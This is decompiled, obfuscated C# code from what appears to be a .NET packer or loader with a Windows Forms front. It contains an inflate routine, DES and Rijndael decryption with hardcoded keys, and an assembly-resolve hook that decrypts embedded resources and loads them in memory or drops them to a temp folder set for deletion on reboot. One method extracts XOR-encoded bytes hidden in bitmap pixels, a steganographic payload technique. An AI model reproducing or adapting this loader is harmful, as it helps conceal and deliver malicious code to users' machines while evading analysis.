using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

[SuppressIldasm]
internal sealed class Class9
{
	[NonSerialized]
	internal static GDelegate0 gdelegate0_0;

	static ICryptoTransform smethod_0(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_0, byte_1) : dESCryptoServiceProvider.CreateEncryptor(byte_0, byte_1);
	}

	static void smethod_1()
	{
		try
		{
			Class9.smethod_26();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_2(Class10.Class13 class13_0, Class10.Class12 class12_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class13_0.int_1), Class9.smethod_9(class12_0));
		int num = 32768 - class13_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class9.smethod_12(class12_0, class13_0.byte_0, class13_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class9.smethod_12(class12_0, class13_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class9.smethod_12(class12_0, class13_0.byte_0, class13_0.int_0, int_0);
		}
		class13_0.int_0 = (class13_0.int_0 + num2) & 0x7FFF;
		class13_0.int_1 += num2;
		return num2;
	}

	static void smethod_3(byte[] byte_0, Class10.Class14 class14_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				array[num]++;
			}
		}
		int num2 = 0;
		int num3 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num2;
			num2 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num4 = array2[j] & 0x1FF80;
				int num5 = num2 & 0x1FF80;
				num3 += num5 - num4 >> 16 - j;
			}
		}
		class14_0.short_0 = new short[num3];
		int num6 = 512;
		for (int num7 = 15; num7 >= 10; num7--)
		{
			int num8 = num2 & 0x1FF80;
			num2 -= array[num7] << 16 - num7;
			int num9 = num2 & 0x1FF80;
			for (int k = num9; k < num8; k += 128)
			{
				class14_0.short_0[Class9.smethod_19(k)] = (short)((-num6 << 4) | num7);
				num6 += 1 << num7 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num10 = byte_0[l];
			if (num10 == 0)
			{
				continue;
			}
			num2 = array2[num10];
			int num11 = Class9.smethod_19(num2);
			if (num10 <= 9)
			{
				do
				{
					class14_0.short_0[num11] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < 512);
			}
			else
			{
				int num12 = class14_0.short_0[num11 & 0x1FF];
				int num13 = 1 << (num12 & 0xF);
				num12 = -(num12 >> 4);
				do
				{
					class14_0.short_0[num12 | (num11 >> 9)] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < num13);
			}
			array2[num10] = num2 + (1 << 16 - num10);
		}
	}

	static void smethod_4(Form0 form0_0)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		form0_0.class1_0 = new Form0.Class1();
		form0_0.icontainer_0 = new Container();
		form0_0.bindingSource_0 = new BindingSource(form0_0.icontainer_0);
		((ISupportInitialize)form0_0.bindingSource_0).BeginInit();
		((Control)form0_0).SuspendLayout();
		((Control)form0_0).get_Controls().Add((Control)(object)form0_0.class1_0);
		((Control)form0_0).set_Name(gdelegate0_0(262));
		((Form)form0_0).add_Load((EventHandler)form0_0.method_0);
		((ISupportInitialize)form0_0.bindingSource_0).EndInit();
		((Control)form0_0).ResumeLayout(false);
	}

	static void smethod_5(Class10.Class12 class12_0)
	{
		class12_0.uint_0 >>= class12_0.int_2 & 7;
		class12_0.int_2 &= -8;
	}

	static Class10.Class14 smethod_6(Class10.Class15 class15_0)
	{
		byte[] array = new byte[class15_0.int_3];
		Array.Copy(class15_0.byte_1, 0, array, 0, class15_0.int_3);
		return new Class10.Class14(array);
	}

	static void smethod_7(Class10.Class13 class13_0, int int_0, int int_1)
	{
		if ((class13_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class13_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class13_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class13_0.byte_0, num, class13_0.byte_0, class13_0.int_0, int_0);
				class13_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class13_0.byte_0[class13_0.int_0++] = class13_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class9.smethod_27(class13_0, num, int_0, int_1);
		}
	}

	static bool smethod_8(Class10.Class11 class11_0)
	{
		switch (class11_0.int_4)
		{
		case 2:
		{
			if (class11_0.bool_0)
			{
				class11_0.int_4 = 12;
				return false;
			}
			int num = Class9.smethod_29(class11_0.class12_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class9.smethod_33(class11_0.class12_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class11_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class9.smethod_5(class11_0.class12_0);
				class11_0.int_4 = 3;
				break;
			case 1:
				class11_0.class14_0 = Class10.Class14.class14_0;
				class11_0.class14_1 = Class10.Class14.class14_1;
				class11_0.int_4 = 7;
				break;
			case 2:
				class11_0.class15_0 = new Class10.Class15();
				class11_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class11_0.int_8 = Class9.smethod_29(class11_0.class12_0, 16)) < 0)
			{
				return false;
			}
			Class9.smethod_33(class11_0.class12_0, 16);
			class11_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class9.smethod_29(class11_0.class12_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class9.smethod_33(class11_0.class12_0, 16);
			class11_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class9.smethod_2(class11_0.class13_0, class11_0.class12_0, class11_0.int_8);
			class11_0.int_8 -= num3;
			if (class11_0.int_8 == 0)
			{
				class11_0.int_4 = 2;
				return true;
			}
			return !Class9.smethod_10(class11_0.class12_0);
		}
		case 6:
			if (!Class9.smethod_36(class11_0.class15_0, class11_0.class12_0))
			{
				return false;
			}
			class11_0.class14_0 = Class9.smethod_6(class11_0.class15_0);
			class11_0.class14_1 = Class9.smethod_30(class11_0.class15_0);
			class11_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class9.smethod_17(class11_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static int smethod_9(Class10.Class12 class12_0)
	{
		return class12_0.int_1 - class12_0.int_0 + (class12_0.int_2 >> 3);
	}

	static bool smethod_10(Class10.Class12 class12_0)
	{
		return class12_0.int_0 == class12_0.int_1;
	}

	static byte[] smethod_11(Bitmap bitmap_0)
	{
		byte[] array = new byte[0];
		List<byte> list = new List<byte>();
		int num = 0;
		do
		{
			int num2 = 0;
			do
			{
				Color pixel = bitmap_0.GetPixel(num, num2);
				if (pixel != Color.FromArgb(0, 0, 0, 0))
				{
					list.AddRange(new byte[3] { pixel.R, pixel.G, pixel.B });
				}
				num2++;
			}
			while (num2 < ((Image)bitmap_0).get_Height());
			num++;
		}
		while (num < ((Image)bitmap_0).get_Width());
		array = list.ToArray();
		int num3 = 0;
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(array[i] ^ Class2.byte_0[num3++]);
			if (num3 == Class2.byte_0.Length)
			{
				num3 = 0;
			}
		}
		return array;
	}

	static int smethod_12(Class10.Class12 class12_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class12_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class12_0.uint_0;
			class12_0.uint_0 >>= 8;
			class12_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class12_0.int_1 - class12_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class12_0.byte_0, class12_0.int_0, byte_0, int_0, int_1);
		class12_0.int_0 += int_1;
		if (((uint)(class12_0.int_0 - class12_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class12_0.uint_0 = class12_0.byte_0[class12_0.int_0++] & 0xFFu;
			class12_0.int_2 = 8;
		}
		return num + int_1;
	}

	static int smethod_13(byte[] byte_0, int int_0, Class10.Class11 class11_0, int int_1)
	{
		int num = 0;
		do
		{
			if (class11_0.int_4 != 11)
			{
				int num2 = Class9.smethod_21(int_1, int_0, byte_0, class11_0.class13_0);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class9.smethod_8(class11_0) || (class11_0.class13_0.int_1 > 0 && class11_0.int_4 != 11));
		return num;
	}

	static void smethod_14(int int_0, byte[] byte_0, Class10.Class12 class12_0, int int_1)
	{
		if (class12_0.int_0 < class12_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class12_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class12_0.int_2);
				class12_0.int_2 += 8;
			}
			class12_0.byte_0 = byte_0;
			class12_0.int_0 = int_1;
			class12_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static Assembly smethod_15(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class4.Struct0 @struct = new Class4.Struct0(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = Class18.smethod_14().Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			lock (Class4.dictionary_0)
			{
				if (Class4.dictionary_0.ContainsKey(text2))
				{
					return Class4.dictionary_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class9.smethod_23(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = string.Format(Class18.smethod_12(), Path.GetTempPath(), text2);
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + Class18.smethod_13();
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class9.MoveFileEx(text5, (string)null, 4);
								Class9.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class4.dictionary_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static Stream smethod_16()
	{
		return (Stream)Class2.resourceManager_0.GetObject(gdelegate0_0(279));
	}

	static bool smethod_17(Class10.Class11 class11_0)
	{
		int num = Class9.smethod_35(class11_0.class13_0);
		while (num >= 258)
		{
			switch (class11_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class9.smethod_24(class11_0.class14_0, class11_0.class12_0)) & -256) == 0)
				{
					Class9.smethod_32(class11_0.class13_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class11_0.int_6 = Class10.Class11.int_0[num2 - 257];
					class11_0.int_5 = Class10.Class11.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class11_0.class14_1 = null;
				class11_0.class14_0 = null;
				class11_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class11_0.int_5 > 0)
				{
					class11_0.int_4 = 8;
					int num4 = Class9.smethod_29(class11_0.class12_0, class11_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class9.smethod_33(class11_0.class12_0, class11_0.int_5);
					class11_0.int_6 += num4;
				}
				class11_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class9.smethod_24(class11_0.class14_1, class11_0.class12_0);
				if (num2 >= 0)
				{
					class11_0.int_7 = Class10.Class11.int_2[num2];
					class11_0.int_5 = Class10.Class11.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class11_0.int_5 > 0)
				{
					class11_0.int_4 = 10;
					int num3 = Class9.smethod_29(class11_0.class12_0, class11_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class9.smethod_33(class11_0.class12_0, class11_0.int_5);
					class11_0.int_7 += num3;
				}
				Class9.smethod_7(class11_0.class13_0, class11_0.int_6, class11_0.int_7);
				num -= class11_0.int_6;
				class11_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static int smethod_18(Class10.Class13 class13_0)
	{
		return class13_0.int_1;
	}

	static short smethod_19(int int_0)
	{
		return (short)((Class10.Class16.byte_0[int_0 & 0xF] << 12) | (Class10.Class16.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class10.Class16.byte_0[(int_0 >> 8) & 0xF] << 4) | Class10.Class16.byte_0[int_0 >> 12]);
	}

	static bool smethod_20(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static int smethod_21(int int_0, int int_1, byte[] byte_0, Class10.Class13 class13_0)
	{
		int num = class13_0.int_0;
		if (int_0 > class13_0.int_1)
		{
			int_0 = class13_0.int_1;
		}
		else
		{
			num = (class13_0.int_0 - class13_0.int_1 + int_0) & 0x7FFF;
		}
		int num2 = int_0;
		int num3 = int_0 - num;
		if (num3 > 0)
		{
			Array.Copy(class13_0.byte_0, 32768 - num3, byte_0, int_1, num3);
			int_1 += num3;
			int_0 = num;
		}
		Array.Copy(class13_0.byte_0, num - int_0, byte_0, int_1, int_0);
		class13_0.int_1 -= num2;
		if (class13_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static int smethod_22(Class10.Class12 class12_0)
	{
		return class12_0.int_2;
	}

	static byte[] smethod_23(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class9.smethod_20(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class10.Stream0 stream = new Class10.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class9.smethod_25(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class9.smethod_31(stream);
			int num3 = Class9.smethod_31(stream);
			int num4 = Class9.smethod_31(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException(Class18.smethod_15());
			}
			Class9.smethod_25(stream);
			Class9.smethod_25(stream);
			Class9.smethod_25(stream);
			int num5 = Class9.smethod_25(stream);
			int num6 = Class9.smethod_31(stream);
			int num7 = Class9.smethod_31(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class10.Class11 class11_ = new Class10.Class11(array2);
			array = new byte[num5];
			Class9.smethod_13(array, 0, class11_, array.Length);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException(Class18.smethod_16());
			}
			if (num8 == 1)
			{
				int num9 = Class9.smethod_25(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class9.smethod_25(stream);
					num11 = Class9.smethod_25(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class10.Class11 class11_2 = new Class10.Class11(array3);
					Class9.smethod_13(array, i, class11_2, num11);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 81, 19, 12, 55, 142, 59, 145, 184 };
				byte[] byte_2 = new byte[8] { 185, 50, 147, 6, 176, 125, 206, 34 };
				using ICryptoTransform cryptoTransform = Class9.smethod_0(bool_0: true, byte_, byte_2);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class9.smethod_23(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class9.smethod_28(byte_5, byte_4, bool_0: true);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class9.smethod_23(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static int smethod_24(Class10.Class14 class14_0, Class10.Class12 class12_0)
	{
		int num;
		int num2;
		if ((num = Class9.smethod_29(class12_0, 9)) >= 0)
		{
			if ((num2 = class14_0.short_0[num]) >= 0)
			{
				Class9.smethod_33(class12_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class9.smethod_29(class12_0, int_)) >= 0)
			{
				num2 = class14_0.short_0[num3 | (num >> 9)];
				Class9.smethod_33(class12_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class12_0.int_2;
			num = Class9.smethod_29(class12_0, int_2);
			num2 = class14_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class9.smethod_33(class12_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class12_0.int_2;
		num = Class9.smethod_29(class12_0, int_3);
		num2 = class14_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class9.smethod_33(class12_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static int smethod_25(Class10.Stream0 stream0_0)
	{
		return Class9.smethod_31(stream0_0) | (Class9.smethod_31(stream0_0) << 16);
	}

	static void smethod_26()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class9.smethod_15;
		}
		catch
		{
		}
	}

	static void smethod_27(Class10.Class13 class13_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class13_0.byte_0[class13_0.int_0++] = class13_0.byte_0[int_0++];
			class13_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static ICryptoTransform smethod_28(byte[] byte_0, byte[] byte_1, bool bool_0)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static int smethod_29(Class10.Class12 class12_0, int int_0)
	{
		if (class12_0.int_2 < int_0)
		{
			if (class12_0.int_0 == class12_0.int_1)
			{
				return -1;
			}
			class12_0.uint_0 |= (uint)(((class12_0.byte_0[class12_0.int_0++] & 0xFF) | ((class12_0.byte_0[class12_0.int_0++] & 0xFF) << 8)) << class12_0.int_2);
			class12_0.int_2 += 16;
		}
		return (int)(class12_0.uint_0 & ((1 << int_0) - 1));
	}

	static Class10.Class14 smethod_30(Class10.Class15 class15_0)
	{
		byte[] array = new byte[class15_0.int_4];
		Array.Copy(class15_0.byte_1, class15_0.int_3, array, 0, class15_0.int_4);
		return new Class10.Class14(array);
	}

	static int smethod_31(Class10.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_32(Class10.Class13 class13_0, int int_0)
	{
		if (class13_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class13_0.byte_0[class13_0.int_0++] = (byte)int_0;
		class13_0.int_0 &= 32767;
	}

	static void smethod_33(Class10.Class12 class12_0, int int_0)
	{
		class12_0.uint_0 >>= int_0;
		class12_0.int_2 -= int_0;
	}

	static void smethod_34()
	{
		try
		{
			Class7.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_35(Class10.Class13 class13_0)
	{
		return 32768 - class13_0.int_1;
	}

	static bool smethod_36(Class10.Class15 class15_0, Class10.Class12 class12_0)
	{
		while (true)
		{
			switch (class15_0.int_2)
			{
			case 5:
			{
				int int_ = Class10.Class15.int_1[class15_0._003C];
				int num = Class9.smethod_29(class12_0, int_);
				if (num >= 0)
				{
					Class9.smethod_33(class12_0, int_);
					num += Class10.Class15.int_0[class15_0._003C];
					while (num-- > 0)
					{
						class15_0.byte_1[class15_0.int_7++] = class15_0.byte_2;
					}
					if (class15_0.int_7 == class15_0.int_6)
					{
						return true;
					}
					goto IL_0075;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class9.smethod_24(class15_0.class14_0, class12_0)) & -16) == 0)
				{
					class15_0.byte_1[class15_0.int_7++] = (class15_0.byte_2 = (byte)num2);
					if (class15_0.int_7 == class15_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class15_0.byte_2 = 0;
					}
					class15_0._003C = num2 - 16;
					class15_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class15_0.int_7 < class15_0.int_5)
				{
					int num3 = Class9.smethod_29(class12_0, 3);
					if (num3 >= 0)
					{
						Class9.smethod_33(class12_0, 3);
						class15_0.byte_0[Class10.Class15.int_8[class15_0.int_7]] = (byte)num3;
						class15_0.int_7++;
						continue;
					}
					return false;
				}
				class15_0.class14_0 = new Class10.Class14(class15_0.byte_0);
				class15_0.byte_0 = null;
				class15_0.int_7 = 0;
				class15_0.int_2 = 4;
				goto case 4;
			case 2:
				class15_0.int_5 = Class9.smethod_29(class12_0, 4);
				if (class15_0.int_5 >= 0)
				{
					class15_0.int_5 += 4;
					Class9.smethod_33(class12_0, 4);
					class15_0.byte_0 = new byte[19];
					class15_0.int_7 = 0;
					class15_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class15_0.int_4 = Class9.smethod_29(class12_0, 5);
				if (class15_0.int_4 >= 0)
				{
					class15_0.int_4++;
					Class9.smethod_33(class12_0, 5);
					class15_0.int_6 = class15_0.int_3 + class15_0.int_4;
					class15_0.byte_1 = new byte[class15_0.int_6];
					class15_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class15_0.int_3 = Class9.smethod_29(class12_0, 5);
				if (class15_0.int_3 >= 0)
				{
					class15_0.int_3 += 257;
					Class9.smethod_33(class12_0, 5);
					class15_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0075:
			class15_0.int_2 = 4;
		}
	}

	static Class9()
	{
		GClass1.smethod_0(typeof(Class9));
	}
}
